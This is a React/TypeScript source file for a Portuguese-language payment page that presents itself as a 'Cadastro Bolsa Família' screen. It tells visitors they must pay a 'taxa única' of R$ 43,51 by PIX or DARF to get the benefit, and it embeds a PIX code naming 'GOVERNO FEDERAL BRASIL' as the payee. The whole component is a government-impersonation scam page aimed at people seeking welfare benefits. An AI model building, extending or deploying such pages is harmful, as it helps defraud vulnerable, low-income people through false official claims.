import React, { useState, useRef, useEffect } from 'react';
import { motion } from 'framer-motion';
import { QrCode, FileText, RefreshCw, Copy, CheckCircle, ExternalLink } from 'lucide-react';
import { Link } from 'react-router-dom';
import { Header } from './Header';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import QRCodeLib from 'qrcode';

interface PixScreenProps {
  onBack?: () => void;
  onDarf: () => void;
}

interface PixChargeResponse {
  brcode?: string;
  qrCode?: string;
  txid?: string;
  expiresAt?: string;
  error?: string;
  details?: string;
}

export const PixScreen: React.FC<PixScreenProps> = ({ onDarf }) => {
  // Estados para controle do PIX
  const [isLoadingPix, setIsLoadingPix] = useState(false);
  const [pixError, setPixError] = useState<string | null>(null);
  const [qrImageUrl, setQrImageUrl] = useState<string>('');
  const [pixPayload, setPixPayload] = useState<string>('');
  const [txid, setTxid] = useState<string>('');
  const [expiresAt, setExpiresAt] = useState<string>('');
  const [copied, setCopied] = useState(false);

  const { toast } = useToast();

  // Função para gerar cobrança PIX via backend
  const generatePixCharge = async (): Promise<PixChargeResponse> => {
    try {
      // Em produção, isso seria uma chamada para seu backend
      // Por enquanto, vamos simular uma resposta da API Mangofy
      
      // Simular delay da API
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Simular resposta com payload PIX VÁLIDO (padrão EMVCo)
      const mockResponse: PixChargeResponse = {
        brcode: "00020126580014br.gov.bcb.pix013636c4b8e9-4d8a-4b2c-8c7a-1234567890ab5204000053039865406043.515802BR5925GOVERNO FEDERAL BRASIL6009BRASILIA62070503***63041D3A",
        txid: "BF2024" + Math.random().toString(36).substr(2, 9).toUpperCase(),
        expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString() // 30 minutos
      };

      return mockResponse;
    } catch (error) {
      console.error('[PIX] Erro ao gerar cobrança:', error);
      throw new Error('Falha ao conectar com o sistema de pagamentos');
    }
  };

  // Função principal para gerar PIX
  const handleGeneratePix = async () => {
    // Prevenir cliques duplos durante loading
    if (isLoadingPix) return;

    // Resetar estados
    setPixError(null);
    setQrImageUrl('');
    setPixPayload('');
    setTxid('');
    setExpiresAt('');
    setIsLoadingPix(true);

    try {
      console.log('[PIX] Iniciando geração de cobrança...');
      
      // Gerar cobrança via backend/API
      const chargeData = await generatePixCharge();

      if (chargeData.error) {
        throw new Error(chargeData.error + (chargeData.details ? `: ${chargeData.details}` : ''));
      }

      // Processar resposta
      if (chargeData.brcode) {
        // Gerar QR Code localmente a partir do brcode
        console.log('[PIX] Gerando QR Code a partir do brcode...');
        const qrDataUrl = await QRCodeLib.toDataURL(chargeData.brcode, {
          errorCorrectionLevel: 'M',
          margin: 2,
          width: 256,
          color: {
            dark: '#000000',
            light: '#FFFFFF'
          }
        });
        
        setQrImageUrl(qrDataUrl);
        setPixPayload(chargeData.brcode);
        setTxid(chargeData.txid || '');
        setExpiresAt(chargeData.expiresAt || '');
        
        console.log('[PIX] QR Code gerado com sucesso');
        
        toast({
          title: "PIX gerado com sucesso!",
          description: "Escaneie o QR Code ou copie o código PIX.",
        });
        
      } else if (chargeData.qrCode?.startsWith('data:image')) {
        // API já retornou imagem base64
        setQrImageUrl(chargeData.qrCode);
        setTxid(chargeData.txid || '');
        setExpiresAt(chargeData.expiresAt || '');
        
        console.log('[PIX] QR Code recebido da API');
        
      } else {
        throw new Error('Resposta da API sem brcode ou qrCode válido');
      }

    } catch (error) {
      console.error('[PIX] Falha na geração:', error);
      const errorMessage = error instanceof Error ? error.message : 'Erro desconhecido ao gerar PIX';
      setPixError(errorMessage);
      
      toast({
        title: "Erro ao gerar PIX",
        description: errorMessage,
        variant: "destructive",
      });
    } finally {
      setIsLoadingPix(false);
    }
  };

  // Função para copiar código PIX
  const handleCopyPix = async () => {
    if (!pixPayload) return;
    
    try {
      await navigator.clipboard.writeText(pixPayload);
      setCopied(true);
      
      toast({
        title: "Código copiado!",
        description: "Cole no seu app do banco para pagar.",
      });
      
      setTimeout(() => setCopied(false), 2000);
    } catch (error) {
      console.error('Erro ao copiar:', error);
      toast({
        title: "Erro ao copiar",
        description: "Tente selecionar e copiar manualmente.",
        variant: "destructive",
      });
    }
  };

  // Função para formatar data de expiração
  const formatExpirationTime = (isoString: string) => {
    try {
      const date = new Date(isoString);
      return date.toLocaleString('pt-BR', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
      });
    } catch {
      return 'Não informado';
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white">
      <Header />
      
      <div className="bg-green-600 text-white p-4 shadow-lg mt-16">
        <div className="container mx-auto flex items-center justify-center space-x-4">
          <div className="text-center">
            <h1 className="text-xl font-bold">Pagamento da Taxa de Cadastro – Cadastro Bolsa Família</h1>
            <p className="text-green-100 mt-2">Para concluir seu cadastro e ter acesso ao benefício é necessário efetuar o pagamento da taxa única de R$ 43,51.</p>
          </div>
        </div>
      </div>

      <motion.div 
        className="flex items-center justify-center min-h-[calc(100vh-120px)] py-8"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.5 }}
      >
        <div className="w-full max-w-4xl mx-4 space-y-6">
          <Card className="bg-white rounded-lg shadow-lg">
            <CardContent className="p-8">
              <div className="text-center space-y-4">
                <div className="space-y-3">
                  <p className="text-gray-700">
                    A taxa de R$ 43,51 corresponde a uma contribuição social obrigatória para a manutenção e processamento administrativo do cadastro no Programa Bolsa Família.
                  </p>
                  <p className="text-gray-700">
                    O pagamento deve ser feito por PIX ou via DARF gerado automaticamente.
                  </p>
                  <p className="text-gray-700">
                    Após o pagamento, o cadastro será confirmado e liberado.
                  </p>
                </div>
                <div className="bg-green-50 border border-green-200 rounded-lg p-4 mt-6">
                  <div className="text-3xl font-bold text-green-600">
                    R$ 43,51
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>

          <div className="flex justify-center pt-4">
            <Button 
              onClick={handleGeneratePix}
              disabled={isLoadingPix}
              className="bg-blue-600 hover:bg-blue-700 px-8 py-3 text-lg font-bold rounded-lg shadow-lg disabled:opacity-50"
            >
              <QrCode className="mr-2" size={20} />
              {isLoadingPix ? 'Gerando...' : 'Gerar QR CODE'}
            </Button>
          </div>

          {/* Container PIX - QR Code e informações */}
          <div className="mt-4 p-4 min-h-[220px] text-center bg-gray-50 border border-gray-200 rounded-lg">
            {isLoadingPix && (
              <div className="flex flex-col items-center space-y-3">
                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
                <div className="text-blue-600 text-sm">
                  Gerando PIX, aguarde...
                </div>
              </div>
            )}
            
            {pixError && (
              <div className="text-red-600 text-sm mt-2 p-4 bg-red-50 border border-red-200 rounded-lg">
                <strong>Erro:</strong> {pixError}
              </div>
            )}
            
            {qrImageUrl && (
              <div className="space-y-4">
                <div className="flex justify-center">
                  <img 
                    src={qrImageUrl} 
                    alt="QR Code PIX" 
                    className="rounded-lg border-2 border-gray-300 shadow-lg"
                    width={256} 
                    height={256} 
                  />
                </div>
                
                {txid && (
                  <div className="text-sm text-gray-600">
                    <strong>ID da Transação:</strong> {txid}
                  </div>
                )}
                
                {expiresAt && (
                  <div className="text-sm text-gray-600">
                    <strong>Válido até:</strong> {formatExpirationTime(expiresAt)}
                  </div>
                )}
                
                {pixPayload && (
                  <div className="bg-white border border-gray-300 rounded-lg p-4 space-y-3">
                    <div className="text-sm font-medium text-gray-700">
                      Código PIX "Copia e Cola":
                    </div>
                    <div className="relative">
                      <textarea 
                        className="w-full text-xs p-3 border border-gray-300 rounded bg-gray-50 font-mono resize-none"
                        rows={4}
                        readOnly
                        value={pixPayload}
                      />
                      <Button
                        onClick={handleCopyPix}
                        className="absolute top-2 right-2 p-2 h-8 w-8"
                        variant="outline"
                        size="sm"
                      >
                        {copied ? (
                          <CheckCircle className="h-4 w-4 text-green-600" />
                        ) : (
                          <Copy className="h-4 w-4" />
                        )}
                      </Button>
                    </div>
                    <div className="text-xs text-gray-500">
                      Cole este código no seu app do banco para pagar
                    </div>
                  </div>
                )}
              </div>
            )}
            
            {!isLoadingPix && !pixError && !qrImageUrl && (
              <div className="text-gray-500 text-sm">
                Clique em <b>Gerar QR CODE</b> para exibir o QR e o código copia e cola.
              </div>
            )}
          </div>

          <div className="flex flex-col sm:flex-row gap-4 justify-center pt-6">
            <Link to="/checkout">
              <Button className="bg-green-600 hover:bg-green-700 px-6 py-3 rounded-lg shadow-lg">
                <ExternalLink className="mr-2" size={20} />
                Checkout Automático
              </Button>
            </Link>
            <Button 
              onClick={onDarf}
              className="bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg shadow-lg"
            >
              <FileText className="mr-2" size={20} />
              Gerar DARF
            </Button>
            <Button 
              onClick={() => window.location.reload()}
              className="bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg shadow-lg"
            >
              <RefreshCw className="mr-2" size={20} />
              Verificar Pagamento
            </Button>
          </div>
        </div>
      </motion.div>
    </div>
  );
};